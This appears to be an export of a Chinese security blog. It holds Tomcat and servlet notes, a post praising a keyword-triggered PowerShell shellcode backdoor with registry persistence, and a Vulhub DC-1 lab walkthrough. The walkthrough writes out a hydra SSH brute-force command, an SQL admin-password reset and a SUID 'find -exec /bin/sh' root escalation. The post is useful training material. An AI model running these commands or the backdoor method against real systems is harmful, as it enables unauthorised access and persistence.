<li>编辑 org.apache.catalina.startup.ContextConfig 文件的 configureStart() 方法，添加初始化 JSP 解析器的代码：<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">context.addServletContainerInitializer(new JasperInitializer(), null);</span><br></pre></td></tr></tbody></table></figure>

</li>
</ol>
<h2 id="开启挖掘漏洞之旅"><a href="#开启挖掘漏洞之旅" class="headerlink" title="开启挖掘漏洞之旅"></a>开启挖掘漏洞之旅</h2><p>　　以上步骤完成之后就可以大展宏图挖漏洞了，不过能不能挖出来还要看技术功底了，不过你可以靠多练习，经过对历史漏洞的研究，相信不就得将来是可以拿到属于自己的CVE的！加油！</p>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li>IDEA 导入 Tomcat9 源码<ul>
<li><a href="https://blog.csdn.net/weixin_30631587/article/details/96528373" target="_blank" rel="noopener">https://blog.csdn.net/weixin_30631587/article/details/96528373</a></li>
</ul>
</li>
<li>idea中导入tomcat源码并运行<ul>
<li><a href="https://www.tqwba.com/x_d/jishu/6220.html" target="_blank" rel="noopener">https://www.tqwba.com/x_d/jishu/6220.html</a></li>
</ul>
</li>
</ul>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>技术基础</category>
      </categories>
      <tags>
        <tag>技术基础</tag>
        <tag>漏洞挖掘</tag>
        <tag>环境部署</tag>
        <tag>源代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>必须知道的requestURI、servletPath、contextPath（转载）</title>
    <url>/posts/558851770/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<p>版权声明：本文为CSDN博主「十二翼堕落天使」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/XY1790026787/article/details/105735272" target="_blank" rel="noopener">https://blog.csdn.net/XY1790026787/article/details/105735272</a></p>
<div id="article_content" class="article_content clearfix">
            <link rel="stylesheet" href="https://csdnimg.cn/release/phoenix/template/css/ck_htmledit_views-211130ba7a.css">
                            <div id="content_views" class="markdown_views prism-github-gist">
                    <!-- flowchart 箭头图标 勿删 -->
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                                            <h2><a name="t0"></a><a name="t0"></a><a id="requestURIservletPathcontextPath_0"></a>一、requestURI、servletPath、contextPath</h2>
<p>假设：</p>
<ul>
<li>当前的项目根目录为：<code>/demo</code>，即访问首页的路径为<code>http://localhost:8080/demo/index.jsp</code>。</li>
<li>页面全部位于 web 根目录下。</li>
</ul>
<p>假设有一个 Servlet：</p>
<pre class="prettyprint"><code class="prism language-java has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestServlet</span> <span class="token keyword">extends</span> <span class="token class-name">HttpServlet</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">service</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span> HttpServletResponse response<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>
        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">service</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"context-path="</span> <span class="token operator">+</span> request<span class="token punctuation">.</span><span class="token function">getContextPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"servlet-path="</span> <span class="token operator">+</span> request<span class="token punctuation">.</span><span class="token function">getServletPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"request-uri="</span> <span class="token operator">+</span> request<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""></ul></pre>
<p>那么访问首页 <code>http://localhost:8080/demo/index.jsp</code>则会输出：</p>
<pre class="prettyprint"><code class="has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">context-path=/demo
servlet-path=/index.jsp
request-uri=/demo/index.jsp
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""></ul></pre>
<h2><a name="t1"></a><a name="t1"></a><a id="_31"></a>二、转发、重定向的参数</h2>
<p>假设当前 Servlet 正在处理的请求的请求路径为<code>/demo/control/login</code>。</p>
<p><strong>带<code>/</code>转发</strong></p>
<p>假设转发的方式为：</p>
<pre class="prettyprint"><code class="prism language-java has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"/home.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""></ul></pre>
<p>那么转发到的路径为：</p>
<ul>
<li><code>http://localhost:8080/demo/home.jsp</code></li>
<li>相对 web 根目录转发。符合期望。</li>
</ul>
<p><strong>不带<code>/</code>转发</strong></p>
<p>假设转发的方式为：</p>
<pre class="prettyprint"><code class="prism language-java has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span><span class="token string">"home.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""></ul></pre>
<p>那么转发到的路径为：</p>
<ul>
<li>
<p><code>http://localhost:8080/demo/control/home.jsp</code></p>
</li>
<li>
<p>相对当前请求路径转发。不符合期望。</p>
</li>
</ul>
<p><strong>带<code>/</code>重定向</strong></p>
<p>假设重定向的方式为：</p>
<pre class="prettyprint"><code class="prism language-java has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">response<span class="token punctuation">.</span><span class="token function">sendRedirect</span><span class="token punctuation">(</span><span class="token string">"/login.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""></ul></pre>
<p>那么重定向的路径为：</p>
<ul>
<li><code>http://localhost:8080/login.jsp</code></li>
<li>相对项目路径（或 context-path）重定向。不符合期望。</li>
</ul>
<p><strong>不带<code>/</code>重定向</strong></p>
<p>假设重定向的方式为：</p>
<pre class="prettyprint"><code class="prism language-java has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">response<span class="token punctuation">.</span><span class="token function">sendRedirect</span><span class="token punctuation">(</span><span class="token string">"login.jsp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""></ul></pre>
<p>那么重定向的路径为：</p>
<ul>
<li><code>http://localhost:8080/demo/control/login.jsp</code></li>
<li>相对当前请求路径转发。不符合期望。</li>
</ul>
<p><strong>URL地址重定向</strong></p>
<p>假设重定向的方式为：</p>
<pre class="prettyprint"><code class="prism language-java has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">response<span class="token punctuation">.</span><span class="token function">sendRedirect</span><span class="token punctuation">(</span><span class="token string">"https://www.google.com/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<div class="hljs-button {2}" data-title="复制"></div></code><ul class="pre-numbering" style=""></ul></pre>
<p>那么重定向的地址为：</p>
<ul>
<li><code>https://www.google.com/</code></li>
<li>符合期望</li>
</ul>
<p><strong>统一格式化</strong></p>
<p>可以定义一个方法来统一处理：</p>
<pre class="prettyprint"><code class="prism language-java has-numbering" onclick="mdcp.copyCode(event)" style="position: unset;">    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">formatResponse</span><span class="token punctuation">(</span>HttpServletRequest request<span class="token punctuation">,</span>
                                      HttpServletResponse response<span class="token punctuation">,</span> 
                                      String target<span class="token punctuation">,</span>
                                      String responseMethod<span class="token punctuation">)</span> <span class="token keyword">throws</span> ServletException<span class="token punctuation">,</span> IOException <span class="token punctuation">{</span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span>responseMethod<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">case</span> <span class="token string">"FORWARD"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                String url <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> target<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"/+"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                request<span class="token punctuation">.</span><span class="token function">getRequestDispatcher</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">case</span> <span class="token string">"REDIRECT"</span><span class="token operator">:</span> <span class="token punctuation">{</span>
                String url<span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>target<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"http"</span><span class="token punctuation">)</span> <span class="token operator">||</span> target<span class="token punctuation">.</span><span class="token function">startsWith</span><span class="token punctuation">(</span><span class="token string">"www."</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    url <span class="token operator">=</span> target<span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    url <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">"/"</span> <span class="token operator">+</span> request<span class="token punctuation">.</span><span class="token function">getContextPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> target<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replaceAll</span><span class="token punctuation">(</span><span class="token string">"/+"</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                response<span class="token punctuation">.</span><span class="token function">sendRedirect</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">default</span><span class="token operator">:</span> <span class="token punctuation">{</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>


<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

</code></pre></div></div><script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>技术基础</category>
      </categories>
      <tags>
        <tag>技术基础</tag>
        <tag>Java基础</tag>
        <tag>框架基础</tag>
        <tag>requestURI</tag>
      </tags>
  </entry>
  <entry>
    <title>Tomcat的DefaultServlet和JspServlet（转载）</title>
    <url>/posts/3555085063/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<p>版权声明：本文为CSDN博主「SouthWind0」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/SouthWind0/article/details/105147262" target="_blank" rel="noopener">https://blog.csdn.net/SouthWind0/article/details/105147262</a></p>
<div class="htmledit_views" id="content_views">
                                            <h2 style="margin-left:0cm;"><a name="t0"></a><a name="t0"></a><a name="_Hlk36219028">Tomcat的DefaultServlet和JspServlet</a></h2>

<p style="margin-left:0cm;">Tomcat在/conf/web.xml中默认定义了两个Servlet，DefaultServlet和JspServlet。该web.xml对于所有tomcat加载的的web application都会应用，会和application本身的web.xml进行合并。</p>

<h3 style="margin-left:0cm;"><a name="t1"></a><a name="t1"></a>1.DefaultServlet</h3>

<p style="margin-left:0cm;">DefaultServlet主要用于处理静态资源文件，如HTML，图片，CSS，JS等文件。</p>

<p style="margin-left:0cm;"><img alt="" height="341" src="https://img-blog.csdnimg.cn/20200327181129813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvdXRoV2luZDA=,size_16,color_FFFFFF,t_70" width="1012"></p>

<p style="margin-left:0cm;"><img alt="" height="129" src="https://img-blog.csdnimg.cn/20200327181129960.png" width="655"></p>

<h3 style="margin-left:0cm;"><a name="t2"></a><a name="t2"></a>2. JspServlet</h3>

<p style="margin-left:0cm;">默认情况下，JspServlet主要负责处理所有的JSP文件请求，如：*.jsp,*.jspx。</p>

<p style="margin-left:0cm;"><img alt="" height="320" src="https://img-blog.csdnimg.cn/20200327181129916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1NvdXRoV2luZDA=,size_16,color_FFFFFF,t_70" width="1002"></p>

<p style="margin-left:0cm;"><img alt="" height="155" src="https://img-blog.csdnimg.cn/20200327181129936.png" width="762"></p>
</div>


<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>技术基础</category>
      </categories>
      <tags>
        <tag>技术基础</tag>
        <tag>Java基础</tag>
        <tag>tomcat</tag>
        <tag>DefaultServletm</tag>
        <tag>JspServlet</tag>
      </tags>
  </entry>
  <entry>
    <title>极客思路之1.使用网站关键字进行反弹shell</title>
    <url>/posts/1714307411/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<blockquote>
<p>版权声明：本文为博主原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接和本声明。<br>本文链接：<a href="https://blog.csdn.net/shuteer_xu/article/details/104958443" target="_blank" rel="noopener">https://blog.csdn.net/shuteer_xu/article/details/104958443</a></p>
</blockquote>
<p>Twitter大牛@MattGraeber和@ChrisCampbell介绍了一种使用网站关键字来触发系统中shellcode的技术。</p>
<p>这种技术的主要优点是shellcode直接从内存中执行，不容易被发现，通过注册表项实现持久化。</p>
<p>C2Code -PowerShell脚本如下:</p>
<p><img src="/posts/1714307411/c9a7b663c6b2791b4c8b26e4a48e4bd2.JPEG" alt="img"></p>
<p>当PowerShell脚本在目标主机上执行时，它将在网站上查找已经给出的特定关键字，如果关键字存在将执行有效负载</p>
<p><img src="/posts/1714307411/d00b3eec9ca5c7c75fbcd5cb14a2febf.png" alt="img"></p>
<p>打开一个Meterpreter会话进行监听，成功反弹回来。</p>
<p><img src="/posts/1714307411/d6a7e6d9e53a28f572ca5eed3b801da5.JPEG" alt="img"></p>
<p><img src="/posts/1714307411/04dcb109e7f0224f3f56d9fd8e917ebe.JPEG" alt="img"></p>
<p>Matt Nelson还创建了一个Office宏，执行相同的技术，但是会另外创建一个注册表项，每次用户登录时执行C2Code PowerShell脚本，以保持持久性。</p>
<p><img src="/posts/1714307411/abf3af278a10f3cb1452c772c9a751a7.JPEG" alt="img"></p>
<p>当用户打开Office文档时，宏将运行，并且执行托管在控制网站上的Invoke-ShellCode脚本。</p>
<p><img src="/posts/1714307411/ab480327b3331a8b430df1a9e2e09cf7.png" alt="img"></p>
<p>Meterpreter监听时同样会建立连接：</p>
<p><img src="/posts/1714307411/d6a7e6d9e53a28f572ca5eed3b801da5.JPEG" alt="img"></p>
<p>这是一个很好的后门方式，没有引入任何新的东西或造成很大的动静，就可以完成一次交互。</p>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>网站关键字,反弹shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulhub靶机DC1实战</title>
    <url>/posts/633281426/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<h3 id="DC-1靶机介绍"><a href="#DC-1靶机介绍" class="headerlink" title="DC-1靶机介绍"></a>DC-1靶机介绍</h3><p><img src="https://img.hacpai.com/file/2020/05/image-a729db41.png" alt="image.png"></p>
<p>英文翻译如下：</p>
<p>　　DC-1是一个有目的建造的易受攻击实验室靶机，目的是在渗透测试领域获得经验。它是为初学者设计的一个挑战，但它的简单程度将取决于你的技能和知识，以及你的学习能力。要成功完成这一挑战，您需要具备Linux技能，熟悉Linux命令行，并具有基本渗透测试工具的经验，例如可以在Kali Linux或Parrot安全操作系统上找到的工具。有多种方法获得root权限，但是，我已经包括了一些标志，其中包含了初学者的线索。总共有五个flag，但最终目标是在根目录中查找和读取flag。您甚至不需要是root用户就可以做到这一点，但是，您将需要root用户特权。根据您的技能水平，您可以跳过查找这些标志，直接查找root。初学者可能会遇到以前从未遇到过的挑战，但是要获得完成此挑战所需的信息，谷歌搜索就足够了。</p>
<h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><p>1.因为不知道root用户的密码，因此无法知道该机的IP地址，所以首先要做的就是知道这台机器的IP地址才能够更好的进行渗透，拿到flag<br>因为该机器与我们的攻击机kali属于同一局域网，因此使用下面的命令来扫描存活的机器：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://img.hacpai.com/file/2020/05/image-886fb7e3.png" alt="image.png"></p>
<p>通过扫描我们可以知道这台机器的IP地址为：192.168.64.138<br>2.正常情况下下一步就是信息收集，我们这里因为不是实际环境，因此略过此步骤。<br>进行端口扫描，<br>使用nmap命令来扫描开放端口：</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">nmap -sV -p- 192.168.64.138</span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://img.hacpai.com/file/2020/05/image-ba6ea67f.png" alt="image.png"><br>3.发现80端口开放，访问可看到该框架基于Drupal<br><img src="https://img.hacpai.com/file/2020/05/image-6656d2b6.png" alt="image.png"></p>
<p>4.使用kali中的msfconsole查找该框架的漏洞并进行利用<br><img src="https://img.hacpai.com/file/2020/05/image-e4cb35ed.png" alt="image.png"></p>
<p>成功拿到第一个flag,根据得到的flag思路，需要到一个配置文件<br><img src="https://img.hacpai.com/file/2020/05/image-620edb03.png" alt="image.png"></p>
<p>5.查找该配置文件，网上查找得知该配置文件默认路劲为：sites/default/settings.php<br><img src="https://img.hacpai.com/file/2020/05/image-7d01e2be.png" alt="image.png"><br><img src="https://img.hacpai.com/file/2020/05/image-6d3e2625.png" alt="image.png"></p>
<p>此处可以发现flag2及数据库重要信息，提示使用已经有的密码文件？？？<br><img src="https://img.hacpai.com/file/2020/05/image-27466a8a.png" alt="image.png"></p>
<p>尝试连接数据库，未果。<br><img src="https://img.hacpai.com/file/2020/05/image-c9c73580.png" alt="image.png"></p>
<p>6.既然无法使用数据库密码进行连接，就要另寻思路，一般linux系统下，用户名及口令都是存放于/etc/passwd , /etc/shadow下<br>查看passwd内容如下，我们意外发现了Flag4用户<br><img src="https://img.hacpai.com/file/2020/05/image-97e3da91.png" alt="image.png"></p>
<p>为此我们就要通过使用kali下的hydra对用户名密码进行爆破，以求能够取得不错的效果<br>爆破还需要john的配合<br>通过下面的命令获取john</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">下载：wget http://www.openwall.com/john/j/john-1.8.0.tar.gz</span><br><span class="line">解压：tar -xvf john-1.8.0.tar.gz</span><br><span class="line">进入src目录：cd john-1.8.0 &amp;&amp; cd src</span><br><span class="line">make:选择自己当前的操作系统</span><br></pre></td></tr></tbody></table></figure>
<p>然后就可以爆破了<br><img src="https://img.hacpai.com/file/2020/05/image-5d1bcf2c.png" alt="image.png"><br>使用hydra+john进行爆破密码</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">hydra -l flag4 -P run/password.lst ssh://192.168.64.138</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://img.hacpai.com/file/2020/05/image-692b88fc.png" alt="image.png"><br><img src="https://img.hacpai.com/file/2020/05/image-662411c9.png" alt="image.png"></p>
<p>使用ssh远程登录flag4<br><img src="https://img.hacpai.com/file/2020/05/image-04c8a4f6.png" alt="image.png"></p>
<p>7.使用得到的数据库密码进行连接，看看能否有收获<br><img src="https://img.hacpai.com/file/2020/05/image-0fceb85a.png" alt="image.png"></p>
<p>得到drupaldb下user表中的数据<br><img src="https://img.hacpai.com/file/2020/05/image-c241ea34.png" alt="image.png"></p>
<p>可见此用户即为web的登录用户，我们尝试修改其密码为password</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">update users set pass="$S$CDbdwZvjHQ09IVRs88G0fnaxPr50/kb81YI9.8M/D9okW7J/s5U4" where uid=1;</span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://img.hacpai.com/file/2020/05/image-2d3f9fea.png" alt="image.png"></p>
<p>web登录admin-password,登陆成功<br><img src="https://img.hacpai.com/file/2020/05/image-8276a0b7.png" alt="image.png"><br><img src="https://img.hacpai.com/file/2020/05/image-0b56c22e.png" alt="image.png"></p>
<p>8.根据上面的提示发现perm，是让我们通过suid提权，SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。<br>suid提权的详细介绍连接如下<br><a href="https://blog.csdn.net/qq_36119192/article/details/84872644" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/84872644</a><br>在这里经过测试发现可以使用find,命令如下</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">find / -type f -perm -u=s 2&gt;/dev/null</span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://img.hacpai.com/file/2020/05/image-35858164.png" alt="image.png"><br><img src="https://img.hacpai.com/file/2020/05/image-79d68f5d.png" alt="image.png"></p>
<p>我们创建一个文件，然后通过find命令查找，然后进行提权操作</p>
<figure class="highlight plain"><table><tbody><tr><td class="code"><pre><span class="line">~$ touch getflag</span><br><span class="line">~$ find / -type f -name getflag -exec "whoami" \;</span><br><span class="line">root</span><br><span class="line">~$ find / -type f -name getflag -exec "/bin/sh" \;</span><br><span class="line"></span><br><span class="line"># ls(成功提权)</span><br></pre></td></tr></tbody></table></figure>
<p><img src="https://img.hacpai.com/file/2020/05/image-47d7d47c.png" alt="image.png"></p>
<p>获取root权限之后，进入root根目录即可看到flag5<br><img src="https://img.hacpai.com/file/2020/05/image-7d7ddb47.png" alt="image.png"></p>
<h3 id="渗透总结"><a href="#渗透总结" class="headerlink" title="渗透总结"></a>渗透总结</h3><p>　　经过这次渗透，熟悉了从基本信息收集到kali metaploit工具使用，之后通过密码爆破得到普通权限用户，最后利用SUID提权拿到root权限的整个思路，渗透完成之后就感觉特别的爽，学到了很多的技巧，希望能够将这些技巧融会贯通，熟练应用，做到心中有数。</p>
<!--
<div class="poem-wrap">
  <div class="poem-border poem-left"></div>
  <div class="poem-border poem-right"></div>
    <h1>念两句诗</h1>
    <p id="poem">挑选中...</p>
    <p id="info">

  <script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script>
  <script type="text/javascript">
    jinrishici.load(function(result) {
      poem.innerHTML = result.data.content
      info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》'
      document.getElementById("poem").value(poem);
      document.getElementById("info").value(info);  
  });
  </script>
</div>
-->

<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>vulhub</tag>
        <tag>dc-1</tag>
        <tag>靶机实战</tag>
      </tags>
  </entry>
  <entry>
    <title>全国大学生信息安全竞赛2019CTF</title>
    <url>/posts/3073343310/</url>
    <content><![CDATA[<br>
<blockquote class="blockquote-center">
<p id="hitokoto"></p>
<script src="https://v1.hitokoto.cn/?encode=js&amp;select=%23hitokoto" defer=""></script>
</blockquote>

<p>题目地址：0x455541c3e9179a6cd8C418142855d894e11A288c@ropsten</p>
<p>1.仍然先从给的源码看有用信息。</p>
<p><img src="/posts/3073343310/image-20200403112433336.png" alt="image-20200403112433336"></p>
<p>又是balanceOf&gt;=10000，要很多的钱。</p>
